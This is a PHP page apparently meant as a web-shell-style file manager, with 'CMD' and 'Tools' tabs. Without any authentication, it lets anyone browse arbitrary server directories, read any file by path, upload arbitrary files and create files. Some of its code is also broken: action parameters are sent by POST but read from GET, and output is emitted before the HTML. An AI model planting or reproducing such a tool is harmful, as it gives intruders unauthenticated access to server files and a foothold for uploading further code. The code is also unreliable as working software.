<?php
ini_set('log_errors', 1);
ini_set('display_errors', 0);

function setCookieDir($dir) {
    setcookie('current_dir', $dir, time() + 7200, '/'); // Set cookie for 2 hours
}

function getCookieDir() {
    return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
}

function path() {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getCookieDir();
    $dir = str_replace("\\", "/", $dir);
    @chdir($dir);
    setCookieDir($dir);
    return $dir;
}

function renderFileList($dir) {
    $items = scandir($dir);
    $directories = [];
    $files = [];

    if ($dir !== '/' && $dir !== getcwd()) {
        $parentPath = dirname($dir);
        $directories[] = [
            'name' => '..',
            'path' => $parentPath,
            'type' => 'dir',
            'link' => "<a href='#' class='dir-link' data-dir='" . $parentPath . "'>..</a>"
        ];
    }

    foreach ($items as $item) {
        if ($item == "." || $item == "..") continue;

        $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
        $info = [
            'name' => $item,
            'path' => $itemPath,
            'link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . $itemPath . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . urlencode($itemPath) . "'>$item</a>"
        ];

        if (is_dir($itemPath)) {
            $directories[] = array_merge($info, ['type' => 'dir']);
        } elseif (is_file($itemPath)) {
            $files[] = array_merge($info, ['type' => 'file']);
        }
    }

    $html = "<div class='directories'><h3>Directories</h3><ul>";
    foreach ($directories as $dir) {
        $html .= "<li>{$dir['link']}</li>";
    }
    $html .= "</ul></div><div class='files'><h3>Files</h3><ul>";
    foreach ($files as $file) {
        $html .= "<li>{$file['link']}</li>";
    }
    $html .= "</ul></div>";

    return $html;
}

$dir = path();

if (isset($_GET['dir'])) {
    echo renderFileList($dir);
    exit();
} elseif (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'create_folder':
            if (isset($_POST['folder_name'])) {
                $folderName = $_POST['folder_name'];
                $newFolderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
                if (!file_exists($newFolderPath)) {
                    mkdir($newFolderPath);
                }
            }
            break;

        case 'create_file':
            if (isset($_POST['file_name'])) {
                $fileName = $_POST['file_name'];
                $newFilePath = $dir . DIRECTORY_SEPARATOR . $fileName;
                if (!file_exists($newFilePath)) {
                    touch($newFilePath);
                }
            }
            break;

        case 'upload':
            if (isset($_FILES['upload_file'])) {
                $file = $_FILES['upload_file'];
                $targetFile = $dir . DIRECTORY_SEPARATOR . basename($file['name']);
                move_uploaded_file($file['tmp_name'], $targetFile);
            }
            break;

        case 'view':
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                $content = file_get_contents($file);
                if ($content !== false) {
                    echo "<p>File Contents: " . htmlspecialchars($file) . "</p>";
                    echo '<pre>' . htmlspecialchars($content) . '</pre>';
                } else {
                    echo "<p>Unable to read file.</p>";
                }
            }
            break;
    }
    exit();
}

// Render initial file list
echo renderFileList($dir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #343a40;
            color: #fff;
        }
        .file-manager {
            margin-top: 20px;
        }
        .file-link, .dir-link {
            color: #198754;
            text-decoration: none;
        }
        .file-link:hover, .dir-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
<div class="container">
    <h1 class="header">File Manager</h1>
    <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
        <li class="nav-item" role="presentation">
            <button class="nav-link active" id="explorer-tab" data-toggle="pill" data-target="#explorer" type="button" role="tab" aria-controls="explorer" aria-selected="true">Home</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="cmd-tab" data-toggle="pill" data-target="#cmd" type="button" role="tab" aria-controls="cmd" aria-selected="false">CMD</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="tools-tab" data-toggle="pill" data-target="#tools" type="button" role="tab" aria-controls="tools" aria-selected="false">Tools</button>
        </li>
    </ul>

    <div class="info-section mb-4">
        <!-- Info section here -->
    </div>

    <div class="file-manager">
        <div id="file-list"></div>
    </div>

    <div class="mb-3">
        <a href="javascript:void(0);" onclick="show('xnewfolder')" class="text-success">[ New Folder ]</a>
        <a href="javascript:void(0);" onclick="show('xnewfile')" class="text-success">[ New File ]</a>
        <a href="javascript:void(0);" onclick="show('xnewupload')" class="text-success">[ Upload ]</a>
    </div>

    <div id="xnewfolder" class="mb-3" style="display:none;">
        <form id="create-folder-form">
            <div class="form-group">
                <label for="folder-name">Folder Name:</label>
                <input type="text" class="form-control" id="folder-name" name="folder_name" required>
            </div>
            <button type="submit" class="btn btn-primary">Create Folder</button>
        </form>
    </div>
    <div id="xnewfile" class="mb-3" style="display:none;">
        <form id="create-file-form">
            <div class="form-group">
                <label for="file-name">File Name:</label>
                <input type="text" class="form-control" id="file-name" name="file_name" required>
            </div>
            <button type="submit" class="btn btn-primary">Create File</button>
        </form>
    </div>
    <div id="xnewupload" class="mb-3" style="display:none;">
        <form id="upload-form" enctype="multipart/form-data">
            <div class="form-group">
                <label for="upload-file">Upload File:</label>
                <input type="file" class="form-control" id="upload-file" name="upload_file" required>
            </div>
            <button type="submit" class="btn btn-primary">Upload</button>
        </form>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
$(document).ready(function() {
    function loadDirectory(dir) {
        $.get('', { dir: dir }, function(data) {
            $('#file-list').html(data);
        });
    }

    $(document).on('click', '.dir-link', function() {
        const dir = $(this).data('dir');
        loadDirectory(dir);
    });

    $(document).on('click', '.file-link', function() {
        const file = $(this).data('file');
        $.get('', { action: 'view', file: file }, function(data) {
            $('#file-list').html(data);
        });
    });

    $('#create-folder-form').on('submit', function(event) {
        event.preventDefault();
        $.post('', $(this).serialize() + '&action=create_folder', function(data) {
            loadDirectory('');
        });
    });

    $('#create-file-form').on('submit', function(event) {
        event.preventDefault();
        $.post('', $(this).serialize() + '&action=create_file', function(data) {
            loadDirectory('');
        });
    });

    $('#upload-form').on('submit', function(event) {
        event.preventDefault();
        $.ajax({
            url: '',
            type: 'POST',
            data: new FormData(this),
            processData: false,
            contentType: false,
            success: function(data) {
                loadDirectory('');
            }
        });
    });

    // Initial load
    loadDirectory('');
});

function show(id) {
    document.getElementById(id).style.display = 'block';
}
</script>
</body>
</html>
